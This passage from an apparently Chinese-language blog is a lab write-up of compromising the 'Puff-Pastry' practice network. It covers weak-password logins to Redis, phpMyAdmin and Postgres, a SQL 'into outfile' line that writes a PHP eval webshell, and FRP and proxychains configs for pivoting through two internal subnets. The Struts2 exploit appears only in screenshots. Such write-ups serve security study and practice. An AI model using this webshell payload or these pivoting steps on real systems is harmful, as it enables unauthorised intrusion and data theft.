+</span></span><span style=display:flex><span>Nmap <span style=color:#ff7b72>done</span>: <span style=color:#a5d6ff>1</span> IP address <span style=color:#ff7b72;font-weight:700>(</span><span style=color:#a5d6ff>1</span> host up<span style=color:#ff7b72;font-weight:700>)</span> scanned in 0.18 seconds
+</span></span></code></pre></div><p>有个弱口令</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>└<span style=color:#ff7b72;font-weight:700>[</span>~/workspace<span style=color:#ff7b72;font-weight:700>]</span>&gt; sudo proxychains4  redis-cli -h 10.85.101.2 -p <span style=color:#a5d6ff>6379</span> -a <span style=color:#a5d6ff>12345</span>
+</span></span><span style=display:flex><span><span style=color:#ff7b72;font-weight:700>[</span>proxychains<span style=color:#ff7b72;font-weight:700>]</span> config file found: /etc/proxychains4.conf
+</span></span><span style=display:flex><span><span style=color:#ff7b72;font-weight:700>[</span>proxychains<span style=color:#ff7b72;font-weight:700>]</span> preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+</span></span><span style=display:flex><span><span style=color:#ff7b72;font-weight:700>[</span>proxychains<span style=color:#ff7b72;font-weight:700>]</span> DLL init: proxychains-ng 4.17
+</span></span><span style=display:flex><span>Warning: Using a password with <span style=color:#a5d6ff>&#39;-a&#39;</span> or <span style=color:#a5d6ff>&#39;-u&#39;</span> option on the command line interface may not be safe.
+</span></span><span style=display:flex><span><span style=color:#ff7b72;font-weight:700>[</span>proxychains<span style=color:#ff7b72;font-weight:700>]</span> Strict chain  ...  192.168.122.102:9998  ...  10.85.101.2:6379  ...  OK
+</span></span><span style=display:flex><span>10.85.101.2:6379&gt; PINg
+</span></span><span style=display:flex><span>PONG
+</span></span><span style=display:flex><span>10.85.101.2:6379&gt; KEYS *
+</span></span><span style=display:flex><span><span style=color:#ff7b72;font-weight:700>(</span>empty array<span style=color:#ff7b72;font-weight:700>)</span>
+</span></span><span style=display:flex><span>10.85.101.2:6379&gt; 
+</span></span></code></pre></div><p>但是为啥是空的&mldr;.</p><p>看了一下巨魔的wp,应该是会有个flag的&mldr;.应该docker运行的时候出了点问题</p><h2 id=phpmyadmin>phpmyadmin</h2><p>再看看phpmyadmin</p><h3 id=弱口令进入后台>弱口令进入后台</h3><p>回到phpmyadmin
+弱口令进入后台</p><pre tabindex=0><code>localhost:root:root
+</code></pre><p><img src=https://img.l1uyun.one/Puff-Pastry%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95_image_13.png></p><p>但是我进不去&mldr;.
+<img src=https://img.l1uyun.one/Puff-Pastry%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95_image_14.png>
+重试了几遍,进去了</p><p>拿到flag
+<img src=https://img.l1uyun.one/Puff-Pastry%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95_image_15.png></p><h3 id=into-outfile写入webshell>into-outfile写入webshell</h3><p>尝试利用,这里去找了一下文章,<a href=https://www.zsblog.org/390.html>PHPMyadmin-Mysql的Getshell姿势汇总 – 张三blog</a>
+先看看有没有权限写入文件,这里设置为空,没有限制
+<img src=https://img.l1uyun.one/Puff-Pastry%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95_image_16.png>
+这俩没啥用,直接猜是/var/www/html试试
+<img src=https://img.l1uyun.one/Puff-Pastry%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95_image_17.png> <img src=https://img.l1uyun.one/Puff-Pastry%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95_image_18.png>
+写入webshell</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span><span style=color:#ff7b72>select</span><span style=color:#6e7681> </span><span style=color:#a5d6ff>&#34;&lt;?php @eval($_POST[1]);?&gt;&#34;</span><span style=color:#6e7681> </span><span style=color:#ff7b72>into</span><span style=color:#6e7681> </span>outfile<span style=color:#6e7681> </span><span style=color:#a5d6ff>&#39;/var/www/html/shell.php&#39;</span><span style=color:#6e7681>
+</span></span></span></code></pre></div><p><img src=https://img.l1uyun.one/Puff-Pastry%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95_image_19.png>
+获取一个webshell
+<img src=https://img.l1uyun.one/Puff-Pastry%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95_image_20.png></p><p>这个机器好像不出网&mldr;.尝试了几种payload,都拿不到shell,也不同wget访问我的攻击机.</p><h3 id=蚁剑>蚁剑</h3><p>网上搜了一下,看到有不出网环境下使用蚁剑的例子.</p><p>用蚁剑看看
+<img src=https://img.l1uyun.one/Puff-Pastry%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95_image_21.png>
+拿到这个flag
+<img src=https://img.l1uyun.one/Puff-Pastry%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95_image_22.png>
+使用蚁剑的终端,来尝试反弹shell,但是还是不行,这好像是个不出网的环境&mldr;
+<img src=https://img.l1uyun.one/Puff-Pastry%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95_image_23.png>
+不过蚁剑带的文件上传功能能用
+<img src=https://img.l1uyun.one/Puff-Pastry%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95_image_24.png></p><h3 id=内网扫描-2>内网扫描</h3><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#ff7b72;font-weight:700>(</span>root:/tmp<span style=color:#ff7b72;font-weight:700>)</span> $ ip a
+</span></span><span style=display:flex><span>1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu <span style=color:#a5d6ff>65536</span> qdisc noqueue state UNKNOWN qlen <span style=color:#a5d6ff>1000</span>
+</span></span><span style=display:flex><span>    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+</span></span><span style=display:flex><span>    inet 127.0.0.1/8 scope host lo
+</span></span><span style=display:flex><span>       valid_lft forever preferred_lft forever
+</span></span><span style=display:flex><span>53: eth0@if54: &lt;BROADCAST,MULTICAST,UP,LOWER_UP,M-DOWN&gt; mtu <span style=color:#a5d6ff>1500</span> qdisc noqueue state UP 
+</span></span><span style=display:flex><span>    link/ether 02:42:0a:55:65:03 brd ff:ff:ff:ff:ff:ff
+</span></span><span style=display:flex><span>    inet 10.85.101.3/24 brd 10.85.101.255 scope global eth0
+</span></span><span style=display:flex><span>       valid_lft forever preferred_lft forever
+</span></span><span style=display:flex><span>57: eth1@if58: &lt;BROADCAST,MULTICAST,UP,LOWER_UP,M-DOWN&gt; mtu <span style=color:#a5d6ff>1500</span> qdisc noqueue state UP 
+</span></span><span style=display:flex><span>    link/ether 02:42:ac:38:66:04 brd ff:ff:ff:ff:ff:ff
+</span></span><span style=display:flex><span>    inet 172.56.102.4/24 brd 172.56.102.255 scope global eth1
+</span></span><span style=display:flex><span>       valid_lft forever preferred_lft forever
+</span></span></code></pre></div><p>执行fscan之后,没有回显,但是有输出文件
+<img src=https://img.l1uyun.one/Puff-Pastry%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95_image_25.png>
+跟之前一样,多了一个172.56.102.1,这到底是啥???🤔,大概率就是我运行docker的parrot机器了</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>172.56.102.1:22 open
+</span></span><span style=display:flex><span>172.56.102.4:80 open
+</span></span><span style=display:flex><span>172.56.102.2:8080 open
+</span></span><span style=display:flex><span>172.56.102.3:5432 open
+</span></span><span style=display:flex><span>172.56.102.4:9000 open
+</span></span><span style=display:flex><span>172.56.102.2:8009 open
+</span></span><span style=display:flex><span><span style=color:#ff7b72;font-weight:700>[</span>+<span style=color:#ff7b72;font-weight:700>]</span> FCGI 172.56.102.4:9000 
+</span></span><span style=display:flex><span>Status: <span style=color:#a5d6ff>403</span> Forbidden
+</span></span><span style=display:flex><span>X-Powered-By: PHP/8.2.8
+</span></span><span style=display:flex><span>Content-type: text/html; <span style=color:#79c0ff>charset</span><span style=color:#ff7b72;font-weight:700>=</span>UTF-8
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Access denied.
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#ff7b72;font-weight:700>[</span>*<span style=color:#ff7b72;font-weight:700>]</span> WebTitle http://172.56.102.4       code:200 len:19411  title:phpMyAdmin
+</span></span><span style=display:flex><span><span style=color:#ff7b72;font-weight:700>[</span>+<span style=color:#ff7b72;font-weight:700>]</span> Postgres:172.56.102.3:5432:postgres password
+</span></span><span style=display:flex><span><span style=color:#ff7b72;font-weight:700>[</span>+<span style=color:#ff7b72;font-weight:700>]</span> InfoScan http://172.56.102.4       <span style=color:#ff7b72;font-weight:700>[</span>phpMyAdmin<span style=color:#ff7b72;font-weight:700>]</span> 
+</span></span><span style=display:flex><span><span style=color:#ff7b72;font-weight:700>[</span>*<span style=color:#ff7b72;font-weight:700>]</span> WebTitle http://172.56.102.2:8080  code:200 len:90     title:<span style=color:#79c0ff>$Title</span>$
+</span></span><span style=display:flex><span><span style=color:#ff7b72;font-weight:700>[</span>+<span style=color:#ff7b72;font-weight:700>]</span> PocScan http://172.56.102.2:8080 poc-yaml-struts2_045 poc1
+</span></span></code></pre></div><h3 id=二重内网环境配置代理>二重内网环境配置代理</h3><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>172.56.102.4   phpmyadmin
+</span></span><span style=display:flex><span>172.56.102.3   Postgres
+</span></span><span style=display:flex><span>172.56.102.2   struts2
+</span></span></code></pre></div><p>这里直接拿巨魔的拓扑图
+<img src=https://img.l1uyun.one/Puff-Pastry%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95_image_26.png>
+我现在需要再配置一个socks代理,服务器放在thinkphp机器上</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-toml data-lang=toml><span style=display:flex><span>serverAddr = <span style=color:#a5d6ff>&#34;10.85.101.4&#34;</span>
+</span></span><span style=display:flex><span>serverPort = <span style=color:#a5d6ff>7000</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>[[proxies]]
+</span></span><span style=display:flex><span>name = <span style=color:#a5d6ff>&#34;tp2php&#34;</span>
+</span></span><span style=display:flex><span>type = <span style=color:#a5d6ff>&#34;tcp&#34;</span>
+</span></span><span style=display:flex><span>remotePort = <span style=color:#a5d6ff>9998</span>
+</span></span><span style=display:flex><span>[proxies.plugin]
+</span></span><span style=display:flex><span>type = <span style=color:#a5d6ff>&#34;socks5&#34;</span>
+</span></span></code></pre></div><p><img src=https://img.l1uyun.one/Puff-Pastry%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95_image_27.png>
+然后在proxychains里面配置两个代理</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>socks5 192.168.122.102 <span style=color:#a5d6ff>9998</span>
+</span></span><span style=display:flex><span>socks5 10.85.101.4 <span style=color:#a5d6ff>9998</span>
+</span></span><span style=display:flex><span>或者
+</span></span><span style=display:flex><span>socks5 127.0.0.1 <span style=color:#a5d6ff>9998</span>
+</span></span><span style=display:flex><span>socks5 127.0.0.1 <span style=color:#a5d6ff>9998</span>
+</span></span></code></pre></div><p>然后nmap扫一下,检查一下代理是否成功.</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>☁  workspace  sudo proxychains nmap -Pn -sT -T4 172.56.102.2 -p8080
+</span></span><span style=display:flex><span><span style=color:#ff7b72;font-weight:700>[</span>proxychains<span style=color:#ff7b72;font-weight:700>]</span> config file found: /etc/proxychains4.conf
+</span></span><span style=display:flex><span><span style=color:#ff7b72;font-weight:700>[</span>proxychains<span style=color:#ff7b72;font-weight:700>]</span> preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+</span></span><span style=display:flex><span><span style=color:#ff7b72;font-weight:700>[</span>proxychains<span style=color:#ff7b72;font-weight:700>]</span> DLL init: proxychains-ng 4.17
+</span></span><span style=display:flex><span>Starting Nmap 7.94SVN <span style=color:#ff7b72;font-weight:700>(</span> https://nmap.org <span style=color:#ff7b72;font-weight:700>)</span> at 2024-08-19 12:21 CST
+</span></span><span style=display:flex><span><span style=color:#ff7b72;font-weight:700>[</span>proxychains<span style=color:#ff7b72;font-weight:700>]</span> Strict chain  ...  127.0.0.1:9998  ...  127.0.0.1:9998  ...  172.56.102.2:8080  ...  OK
+</span></span><span style=display:flex><span>Nmap scan report <span style=color:#ff7b72>for</span> 172.56.102.2
+</span></span><span style=display:flex><span>Host is up <span style=color:#ff7b72;font-weight:700>(</span>0.0058s latency<span style=color:#ff7b72;font-weight:700>)</span>.
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>PORT     STATE SERVICE
+</span></span><span style=display:flex><span>8080/tcp open  http-proxy
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Nmap <span style=color:#ff7b72>done</span>: <span style=color:#a5d6ff>1</span> IP address <span style=color:#ff7b72;font-weight:700>(</span><span style=color:#a5d6ff>1</span> host up<span style=color:#ff7b72;font-weight:700>)</span> scanned in 1.89 seconds
+</span></span></code></pre></div><p>代理成功了,接下来需要在Windows上面也使用多重代理,这时候要上proxifier了.
+<img src=https://img.l1uyun.one/Puff-Pastry%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95_image_28.png>
+配置完之后,成功访问Struts服务器.
+<img src=https://img.l1uyun.one/Puff-Pastry%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95_image_29.png></p><h2 id=struts>Struts</h2><p>漏洞存在
+<img src=https://img.l1uyun.one/Puff-Pastry%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95_image_30.png>
+执行命令
+<img src=https://img.l1uyun.one/Puff-Pastry%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95_image_31.png>
+获取flag
+<img src=https://img.l1uyun.one/Puff-Pastry%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95_image_32.png></p><h2 id=postgres>Postgres</h2><p>之前fscan扫出来的弱口令
+<code>[+] Postgres:172.56.102.3:5432:postgres password</code></p><p>登录之后获取flag</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>☁  workspace  sudo proxychains psql -h 172.56.102.3 -p <span style=color:#a5d6ff>5432</span> -U postgres
+</span></span><span style=display:flex><span><span style=color:#ff7b72;font-weight:700>[</span>sudo<span style=color:#ff7b72;font-weight:700>]</span> password <span style=color:#ff7b72>for</span> l1uyun: 
+</span></span><span style=display:flex><span><span style=color:#ff7b72;font-weight:700>[</span>proxychains<span style=color:#ff7b72;font-weight:700>]</span> config file found: /etc/proxychains4.conf
+</span></span><span style=display:flex><span><span style=color:#ff7b72;font-weight:700>[</span>proxychains<span style=color:#ff7b72;font-weight:700>]</span> preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+</span></span><span style=display:flex><span><span style=color:#ff7b72;font-weight:700>[</span>proxychains<span style=color:#ff7b72;font-weight:700>]</span> DLL init: proxychains-ng 4.17
+</span></span><span style=display:flex><span><span style=color:#ff7b72;font-weight:700>[</span>proxychains<span style=color:#ff7b72;font-weight:700>]</span> DLL init: proxychains-ng 4.17
+</span></span><span style=display:flex><span><span style=color:#ff7b72;font-weight:700>[</span>proxychains<span style=color:#ff7b72;font-weight:700>]</span> Strict chain  ...  127.0.0.1:9998  ...  127.0.0.1:9998  ...  172.56.102.3:5432  ...  OK
+</span></span><span style=display:flex><span>Password <span style=color:#ff7b72>for</span> user postgres: 
+</span></span><span style=display:flex><span><span style=color:#ff7b72;font-weight:700>[</span>proxychains<span style=color:#ff7b72;font-weight:700>]</span> Strict chain  ...  127.0.0.1:9998  ...  127.0.0.1:9998  ...  172.56.102.3:5432  ...  OK
+</span></span><span style=display:flex><span>psql <span style=color:#ff7b72;font-weight:700>(</span>16.3 <span style=color:#ff7b72;font-weight:700>(</span>Debian 16.3-1<span style=color:#ff7b72;font-weight:700>)</span>, server 16.4<span style=color:#ff7b72;font-weight:700>)</span>
+</span></span><span style=display:flex><span>Type <span style=color:#a5d6ff>&#34;help&#34;</span> <span style=color:#ff7b72>for</span> help.
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#79c0ff>postgres</span><span style=color:#ff7b72;font-weight:700>=</span><span style=color:#8b949e;font-style:italic># help</span>
+</span></span><span style=display:flex><span>You are using psql, the command-line interface to PostgreSQL.
+</span></span><span style=display:flex><span>Type:  <span style=color:#79c0ff>\c</span>opyright <span style=color:#ff7b72>for</span> distribution terms
+</span></span><span style=display:flex><span>       <span style=color:#79c0ff>\h</span> <span style=color:#ff7b72>for</span> help with SQL commands
+</span></span><span style=display:flex><span>       <span style=color:#79c0ff>\?</span> <span style=color:#ff7b72>for</span> help with psql commands
+</span></span><span style=display:flex><span>       <span style=color:#79c0ff>\g</span> or terminate with semicolon to execute query
+</span></span><span style=display:flex><span>       <span style=color:#79c0ff>\q</span> to quit
+</span></span><span style=display:flex><span><span style=color:#79c0ff>postgres</span><span style=color:#ff7b72;font-weight:700>=</span><span style=color:#8b949e;font-style:italic># \dt</span>
+</span></span><span style=display:flex><span>Did not find any relations.
+</span></span><span style=display:flex><span><span style=color:#79c0ff>postgres</span><span style=color:#ff7b72;font-weight:700>=</span><span style=color:#8b949e;font-style:italic># \l</span>
+</span></span><span style=display:flex><span>                                                      List of databases
+</span></span><span style=display:flex><span>   Name    |  Owner   | Encoding | Locale Provider |  Collate   |   Ctype    | ICU Locale | ICU Rules |   Access privileges   
+</span></span><span style=display:flex><span>-----------+----------+----------+-----------------+------------+------------+------------+-----------+-----------------------
+</span></span><span style=display:flex><span> flag      | postgres | UTF8     | libc            | en_US.utf8 | en_US.utf8 |            |           | 
+</span></span><span style=display:flex><span> postgres  | postgres | UTF8     | libc            | en_US.utf8 | en_US.utf8 |            |           | 
+</span></span><span style=display:flex><span> template0 | postgres | UTF8     | libc            | en_US.utf8 | en_US.utf8 |            |           | <span style=color:#ff7b72;font-weight:700>=</span>c/postgres          +
+</span></span><span style=display:flex><span>           |          |          |                 |            |            |            |           | <span style=color:#79c0ff>postgres</span><span style=color:#ff7b72;font-weight:700>=</span>CTc/postgres
+</span></span><span style=display:flex><span> template1 | postgres | UTF8     | libc            | en_US.utf8 | en_US.utf8 |            |           | <span style=color:#ff7b72;font-weight:700>=</span>c/postgres          +
+</span></span><span style=display:flex><span>           |          |          |                 |            |            |            |           | <span style=color:#79c0ff>postgres</span><span style=color:#ff7b72;font-weight:700>=</span>CTc/postgres
+</span></span><span style=display:flex><span><span style=color:#ff7b72;font-weight:700>(</span><span style=color:#a5d6ff>4</span> rows<span style=color:#ff7b72;font-weight:700>)</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#79c0ff>postgres</span><span style=color:#ff7b72;font-weight:700>=</span><span style=color:#8b949e;font-style:italic># \c flag</span>
+</span></span><span style=display:flex><span><span style=color:#ff7b72;font-weight:700>[</span>proxychains<span style=color:#ff7b72;font-weight:700>]</span> Strict chain  ...  127.0.0.1:9998  ...  127.0.0.1:9998  ...  172.56.102.3:5432  ...  OK
+</span></span><span style=display:flex><span>psql <span style=color:#ff7b72;font-weight:700>(</span>16.3 <span style=color:#ff7b72;font-weight:700>(</span>Debian 16.3-1<span style=color:#ff7b72;font-weight:700>)</span>, server 16.4<span style=color:#ff7b72;font-weight:700>)</span>
+</span></span><span style=display:flex><span>You are now connected to database <span style=color:#a5d6ff>&#34;flag&#34;</span> as user <span style=color:#a5d6ff>&#34;postgres&#34;</span>.
+</span></span><span style=display:flex><span><span style=color:#79c0ff>flag</span><span style=color:#ff7b72;font-weight:700>=</span><span style=color:#8b949e;font-style:italic># \dt</span>
+</span></span><span style=display:flex><span>        List of relations
+</span></span><span style=display:flex><span> Schema | Name | Type  |  Owner
+</span></span><span style=display:flex><span>--------+------+-------+----------
+</span></span><span style=display:flex><span> public | flag | table | postgres
+</span></span><span style=display:flex><span><span style=color:#ff7b72;font-weight:700>(</span><span style=color:#a5d6ff>1</span> row<span style=color:#ff7b72;font-weight:700>)</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#79c0ff>flag</span><span style=color:#ff7b72;font-weight:700>=</span><span style=color:#8b949e;font-style:italic># SELECT * FROM FLAG;</span>
+</span></span><span style=display:flex><span>                            data
+</span></span><span style=display:flex><span>-------------------------------------------------------------
+</span></span><span style=display:flex><span> WSS-Studio<span style=color:#ff7b72;font-weight:700>{</span>Postgresql-cb6cba4a-6d7b-43b6-bfc4-0146b0d0e5af<span style=color:#ff7b72;font-weight:700>}</span>
+</span></span><span style=display:flex><span><span style=color:#ff7b72;font-weight:700>(</span><span style=color:#a5d6ff>1</span> row<span style=color:#ff7b72;font-weight:700>)</span>
+</span></span></code></pre></div><h1 id=links>links</h1><p><a href=https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/docs/Independent-Environment/Puff-Pastry/>Puff-Pastry | Target Machines WriteUp</a></p><p><a href=https://blog.csdn.net/imtech/article/details/139829808>FRP内网穿透及多级代理的使用</a></p></div></article><hr><div class=pagination><div class=pagination__buttons><span class="button previous"><a href=https://l1uyun.one/posts/2024/08/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/><span class=button__icon>←</span>
+<span class=button__text>红日靶场1</span>
+</a></span><span class="button next"><a href=https://l1uyun.one/posts/2024/08/springboot%E5%88%A9%E7%94%A8/><span class=button__text>springboot利用</span>
+<span class=button__icon>→</span></a></span></div></div><script src=https://utteranc.es/client.js repo=L1uYun/l1uyun_blog label="blog comment" issue-term=title theme=github-light crossorigin=anonymous async></script></main></div><footer class=footer><div class=footer__inner><div class=footer__content><span>&copy; 2024</span>
+<span><a href=https://l1uyun.one/></a></span><span><a href=https://creativecommons.org/licenses/by-nc/4.0/ target=_blank rel=noopener>CC BY-NC 4.0</a></span>
+<span><a href=https://l1uyun.one/posts/index.xml target=_blank title=rss><svg width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 019 9"/><path d="M4 4a16 16 0 0116 16"/><circle cx="5" cy="19" r="1"/></svg></a></span><div class=busuanzi-footer><span id=busuanzi_container_site_pv>本站总访问量<span id=busuanzi_value_site_pv></span>次
+</span><span id=busuanzi_container_site_uv>本站访客数<span id=busuanzi_value_site_uv></span>人次</span></div></div></div><div class=footer__inner><div class=footer__content><span>Powered by <a href=http://gohugo.io>Hugo</a></span><span>Made with &#10084; by <a href=https://github.com/rhazdon>Djordje Atlialp</a></span></div></div></footer></div><script type=text/javascript src=/bundle.min.243fec32d3a4ae91a0f3d22849096c696784566f8bf3d340ce4ebfd711d99f3cac4489fe226e2645c6c5c284d863f37ddc0d610af7b3fa108a2d4387981d3db7.js integrity="sha512-JD/sMtOkrpGg89IoSQlsaWeEVm+L89NAzk6/1xHZnzysRIn+Im4mRcbFwoTYY/N93A1hCvez+hCKLUOHmB09tw=="></script><script src=/js/view-image.min.js></script><script>window.ViewImage&&ViewImage.init(".content img")</script></body></html>
